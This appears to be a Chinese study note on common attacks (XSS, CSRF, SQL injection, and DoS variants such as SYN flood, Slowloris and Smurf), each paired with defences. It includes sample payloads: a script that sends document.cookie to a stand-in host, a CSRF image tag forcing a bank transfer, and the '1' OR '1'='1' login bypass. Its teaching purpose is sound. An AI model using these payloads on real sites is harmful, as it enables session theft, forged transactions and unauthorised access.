# 攻击技术

## 跨站脚本攻击

- 概念

  跨站脚本攻击（Cross-Site Scripting, XSS），可以将代码注入到用户浏览的网页上，这种代码包括 HTML 和 JavaScript。

- 攻击原理

  例如有一个论坛网站，攻击者可以在上面发布以下内容：

```html
<script>location.href="//domain.com/?c=" + document.cookie</script>
```

​	之后该内容可能会被渲染成以下形式：

```html
<p><script>location.href="//domain.com/?c=" + document.cookie</script></p>
```

​	另一个用户浏览了含有这个内容的页面将会跳转到 domain.com 并携带了当前作用域的 Cookie。如果这个论坛网站通过 Cookie 管理	用户登录状态，那么攻击者就可以通过这个 Cookie 登录被攻击者的账号了。

- 危害
  - 窃取用户的 Cookie
  - 伪造虚假的输入表单骗取个人信息
  - 显示伪造的文章或者图片

- 防范手段
  - 设置 Cookie 为 HttpOnly

    设置了 HttpOnly 的 Cookie 可以防止 JavaScript 脚本调用，就无法通过 document.cookie 获取用户 Cookie 信息。

- 过滤特殊字符

  例如将 `<` 转义为 `&lt;`，将 `>` 转义为 `&gt;`，从而避免 HTML 和 Jascript 代码的运行。

  富文本编辑器允许用户输入 HTML 代码，就不能简单地将 `<` 等字符进行过滤了，极大地提高了 XSS 攻击的可能性。

  富文本编辑器通常采用 XSS filter 来防范 XSS 攻击，通过定义一些标签白名单或者黑名单，从而不允许有攻击性的 HTML 代码的输入。

  以下例子中，form 和 script 等标签都被转义，而 h 和 p 等标签将会保留。

```html
<h1 id="title">XSS Demo</h1>

<p>123</p>

<form>
  <input type="text" name="q" value="test">
</form>

<pre>hello</pre>

<script type="text/javascript">
alert(/xss/);
</script>
```

```html
<h1>XSS Demo</h1>

<p>123</p>

&lt;form&gt;
  &lt;input type="text" name="q" value="test"&gt;
&lt;/form&gt;

<pre>hello</pre>

&lt;script type="text/javascript"&gt;
alert(/xss/);
&lt;/script&gt;
```

## 跨站请求伪造

- 概念

  跨站请求伪造（Cross-site request forgery，CSRF），是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件，发消息，甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。

  XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户浏览器的信任。

- 攻击原理

  假如一家银行用以执行转账操作的 URL 地址如下：

```
	http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName。
```

​	那么，一个恶意攻击者可以在另一个网站上放置如下代码：

```
	<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">。
```

​	如果有账户名为 Alice 的用户访问了恶意站点，而她之前刚访问过银行不久，登录信息尚未过期，那么她就会损失 1000 美元。

​	这种恶意的网址可以有很多种形式，藏身于网页中的许多地方。此外，攻击者也不需要控制放置恶意网址的网站。例如他可以将这种地	址藏在论坛，博客等任何用户生成内容的网站中。这意味着如果服务器端没有合适的防御措施的话，用户即使访问熟悉的可信网站也有	受攻击的危险。

​	通过例子能够看出，攻击者并不能通过 CSRF 攻击来直接获取用户的账户控制权，也不能直接窃取用户的任何信息。他们能做到的，是	欺骗用户浏览器，让其以用户的名义执行操作。

- 防范手段
  - 检查 Referer 首部字段

    Referer 首部字段位于 HTTP 报文中，用于标识请求来源的地址。检查这个首部字段并要求请求来源的地址在同一个域名下，可以极大的防止 CSRF 攻击。

    这种办法简单易行，工作量低，仅需要在关键访问处增加一步校验。但这种办法也有其局限性，因其完全依赖浏览器发送正确的 Referer 字段。虽然 HTTP 协议对此字段的内容有明确的规定，但并无法保证来访的浏览器的具体实现，亦无法保证浏览器没有安全漏洞影响到此字段。并且也存在攻击者攻击某些浏览器，篡改其 Referer 字段的可能。

  - 添加校验 Token

    在访问敏感数据请求时，要求用户浏览器提供不保存在 Cookie 中，并且攻击者无法伪造的数据作为校验。例如服务器生成随机数并附加在表单中，并要求客户端传回这个随机数。

  - 输入验证码

    因为 CSRF 攻击是在用户无意识的情况下发生的，所以要求用户输入验证码可以让用户知道自己正在做的操作。

## SQL 注入攻击

- 概念

  服务器上的数据库运行非法的 SQL 语句，主要通过拼接来完成。

- 攻击原理

  例如一个网站登录验证的 SQL 查询代码为：

```sql
  strSQL = "SELECT * FROM users WHERE (name = '" + userName + "') and (pw = '"+ passWord +"');"
```

​	如果填入以下内容：

```sql
  userName = "1' OR '1'='1";
  passWord = "1' OR '1'='1";
```

​	那么 SQL 查询字符串为：

```sql
  strSQL = "SELECT * FROM users WHERE (name = '1' OR '1'='1') and (pw = '1' OR '1'='1');"
```

​	此时无需验证通过就能执行以下查询：

```sql
strSQL = "SELECT * FROM users;"
```

- 防范手段
  - 使用参数化查询

  Java 中的 PreparedStatement 是预先编译的 SQL 语句，可以传入适当参数并且多次执行。由于没有拼接的过程，因此可以防止 SQL 注入的发生。

```java
    PreparedStatement stmt = connection.prepareStatement("SELECT * FROM users WHERE userid=? AND 		password=?");
    stmt.setString(1, userid);
    stmt.setString(2, password);
    ResultSet rs = stmt.executeQuery();
```

- 单引号转换

  将传入的参数中的单引号转换为连续两个单引号，PHP 中的 Magic quote 可以完成这个功能。

## 拒绝服务攻击

拒绝服务攻击（denial-of-service attack，DoS），亦称洪水攻击，其目的在于使目标电脑的网络或系统资源耗尽，使服务暂时中断或停止，导致其正常用户无法访问。

分布式拒绝服务攻击（distributed denial-of-service attack，DDoS），指攻击者使用两个或以上被攻陷的电脑作为“僵尸”向特定的目标发动“拒绝服务”式攻击。

- **Ping of Death**

  ping实用程序使用的ICMP包很大（如65535字节），远远大于普通大小（32字节）时，它就会被分片，分割为网络可以处理的大小。服务器处理大量ICMP包时会消耗大量系统资源，最终资源耗尽，导致瘫痪。

  处理办法：

  ​		可以禁止使用ping，

  ​		防火墙配置ICMP协议的访问规则。

  ​		对重组的数据包进行检查，同时创建一个足够大的缓冲区去处理超过最大大小的数据包。

- **Land Attack**

  请求TCP连接发送SYN包时，SYN包具有相同源地址与目的地址，均设置为服务器地址。这样，服务器回送SYN/ACK包时，发现目的地址就是自己，导致服务器不断向自己发送SYN/ACK包，最终造成系统崩溃。

  处理办法

  ​	在给服务器之前加一道防线，设定规则抓包分析，如果发现源地址与目的地址相同则丢弃。

- **TCP SYN Flood**

  该攻击利用了TCP连接中的安全缺陷。客户机向服务器发送SYN包时，服务器会向客户机发送SYN/ACK包。然后，客户机向服务器ACK包建立TCP连接。如果最后一步客户机不向服务器发送ACK包，则服务器一直等待，处于SYN received状态。不断重复这一过程，服务器的缓冲将被全部耗尽，从而瘫痪。

  处理方法

  SYN Cookies

  ​	(1)只收到SYN之后，不分配资源，只有收到最终的ACK之后才分配资源；

  ​	(2)服务器收到SYN之后，根据服务器自身的一个密钥+SYN包中的部分信息（IP、端口和序列号）计算出返回的SYN+ACK中的序列	号，	这个序列号是攻击者无法计算出来的，因为攻击者不知道服务器的密钥。因此攻击者最终无法发送正确的ACK消息，这样就	会保证不会	分配服务器资源。

  ​	但是计算也是需要cpu资源

  • SYN Proxy

  ​	原理就是在给源站之前部署一个代理，发送到服务端的请求，如果完成了三次握手就原封不动的转发给源站，如果没有，则不提交	请求给源站了。需要注意的是TCP使用的序号要进行重新设置才能正常发送。

  • SYN Reset

  ​	原理是防火墙模拟服务端回复错误的ACK，当客户端收到错误的ACK会返回一个reset，那么这样防火墙就知道客户端是一个正常的	请求。下一次客户端再请求时就可以进行放行。

- **Slowloris Attack**

  黑客向服务器发送非正常的HTTP请求头，服务器认为请求部分没有结束，保持连接不释放，继续等待完整请求。随着这种开放状态的连接数量增加，服务器连接数会很快达到上限，从而无法处理新的请求。

  正常的HTTP头以/r/n/r/n结束。web服务器通过查找/r/n/r/n判断HTTP头结束，然后继续后面的服务请求处理工作。Slowloris攻击使用的HTTP头只以/r/n结尾，所以web服务器认为HTTP还没有结束，保持连接。攻击开始后数分钟内，web服务器就会陷入瘫痪，无法继续对外提供服务。

  处理办法

  - 升级硬件配置，增加允许的最大连接数；
  - 限制来自同一IP的连接个数；
  - 安装防火墙，拦截有错误的HTTP头。

- **Tear Drop攻击**

  传送大数据包时，会先对数据包进行分片，这些分片达到目的地时再重新组装。分片数据包含分片的偏移量，可以通过操纵偏移量，使其大于实际值，造成重叠偏移。这会引发服务器溢出问题，使服务器陷入瘫痪。

  处理办法

  ​	将收到的分片报文放入缓存中，根据源地址IP和目的IP进行分组，相同源和目的IP的为一组，然后对每组IP报文的分片进行检查，	如果偏移量正确则传送给服务端，否则丢弃。如果缓存满了，则直接丢弃后续分片报文。

- **Smurf 攻击**

  类似于着陆攻击，利用ICMP包的特性，发送ICMP包之前，先将ICMP包的源地址改为目标服务器地址。这样，每个接收到ICMP请求的主机都会做出答复，导致服务器被大量ICMP响应吞没，网络发生阻塞，从而拒绝为正常请求服务。

  常见解决方法包括：

  - 如果是在内网发起：配置路由器禁止IP广播包进网。

    在路由器上禁止ICMPECHOREPLY包进入，几乎在所有的情况下，这种功能是不必要的。应该在网络的所有路由器上都禁止这个功能，而不仅仅在与外部网络连接的路由器上禁止。例如，网络上有5个路由器连接着10个LAN，则应该在这5个路由器上都禁止IP广播包通过。

    配置网络上所有计算机的操作系统，禁止对目标地址为广播地址的ICMP包响应。虽然对路由器进行了禁止网外ICMP广播包的进入，但是攻击者可能已经攻破了网络内部的某台主机，攻击者仍然可以使用网络上这台被他控制的主机发起Smurf攻击。

  - 如果是外网发起：与ISP协商

    对被攻击的目标而言，要防止接收到大量的ICMPECHOREPLY包的攻击没有一个简单的解决办法。虽然可以对被攻击网络的路由器进行配置，禁止ICMPECHOREPLY包进入，但这并不能阻止网络路由器到其ISP 之间的网络拥塞。

    ISP也就是网络服务提供商，国内基本上就是三大运营商：电信、联通、移动。部分可以提供这类抗D服务。或者购买专业的抗D厂商（这些厂商也购买了运营商的服务），好处就是厂商会摊薄成本，因为购买一次性投入大，如果大家共享使用，就可以按需付费，减少支出成本。

    国外有的是自建网络，比如云厂商会有自己的网络，那么他们可以控制网络上的策略，也是购买抗D服务进行配置即可。

- **HTTP洪水攻击**

  黑客操控大量僵尸主机，利用这些僵尸主机大量调用正常服务，使服务瘫痪。这种使用大量主机发送攻击的成功率更高。也被称为ddos攻击。

  处理办法：

  ​	很难针对这种ddos攻击进行有效防御，需要接入高防机房，结合威胁情报进行过滤。

- **DNS Query Flood**

  通过向被攻击的服务器发送海量的域名解析请求，并且这些域名都是不存在的，被攻击的DNS服务器在接收到域名解析后，首先会在服务器上查找是否存在，没有的时候会向上层DNS服务递归查询域名信息。大量不存在的域名解析请求会给服务器带来很大的负载，造成DNS服务器域名解析超时。DNS服务器崩溃后，依赖DNS服务器的其他web应用也就无法正常提供服务了。

  解决办法

  ​	在流量入口网关处建立已有域名白名单，首先跟名单中的域名比对，如果一致，则放行，不一致则拦截。域名白名单人力维护不现实，如果有资产管理系统可以结合应用起来，通过同步资产管理系统的域名，自动更新域名白名单。

- **ICMP Redirection**

  攻击者伪装成路由器，向被攻击主机发送ICMP重定向报文，被攻击主机会更新自己的路由表，下次访问某个地址的时候，就会将请求发送给攻击者，攻击者这样就截取到了被攻击主机的信息。

  解决方案：

  ​	可以在路由器或防火墙上关闭ICMP重定向功能，或者直接过滤掉ICMP包

- **Winnuke**

  windows系统的139端口是给NetBIOS用的，用于局域网主机之间的通信。如果往139端口发送一个URG位为1的请求，会导致windows系统出现蓝屏。

  解决方案：

  ​	判断URG位是否为1，或者是在防火墙或路由器设备上对这类报文进行过滤

- **ARP Flood**

  攻击者使用不同的<mac,ip>地址对发送大量的ARP报文，最终导致交换机的ARP表溢出

  解决方案：

  ​	交换机上对IP和MAC进行绑定，如果发现不一致的报文，则丢弃

  ​	在DHCP服务器上记录分配的IP和MAC绑定关系，如果发现不一致的报文，则丢弃

  ​	ARP限速，如果某段时间某个端口发送了大量的ARP报文，则将此端口屏蔽